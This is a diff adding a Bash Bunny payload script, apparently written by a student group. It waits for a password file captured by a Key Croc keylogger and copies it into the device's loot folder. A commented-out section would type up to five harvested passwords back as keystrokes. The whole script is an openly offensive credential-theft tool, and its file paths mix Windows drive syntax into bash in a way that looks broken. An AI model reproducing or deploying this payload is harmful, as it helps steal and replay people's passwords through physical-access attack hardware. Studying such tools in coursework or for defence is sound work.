@@ -1,0 +1,42 @@
+# Bash Bunny Attact: 
+# Waits for the sniffed password from key croc.
+# And copies it to the loot folder.
+
+# Written by:
+# - Prince Samuel Kyeremanteng
+# - Hadar Eklund
+# - Group 24.
+
+ATTACKMODE HID STORAGE
+
+# Mount storage to access loot folder
+mount /dev/nandf /root/udisk/
+
+# ATTACK ONE: 
+
+while true; do
+  if [ -f H:/password.txt ]; then
+    cp /H:/password.txt /root/udisk/loot/
+    break
+  fi
+  sleep 1
+done
+
+# wait for 3 seconds for file to copy
+sleep 3
+
+# for debugging
+# count=0
+# sed 's/\r$//' /root/udisk/loot/password.txt | while read -r word; do
+#    if [ $count -ge 5 ]; then break; fi  # Limit to 5 attempts
+#    # Type the password
+#    QUACK STRING "$word"
+#    # Press Enter
+#    QUACK ENTER
+#    # Wait 2 seconds
+#    sleep 2
+#    count=$((count+1))
+#done
+
+# wait for 2 seconds and exit
+sleep 2
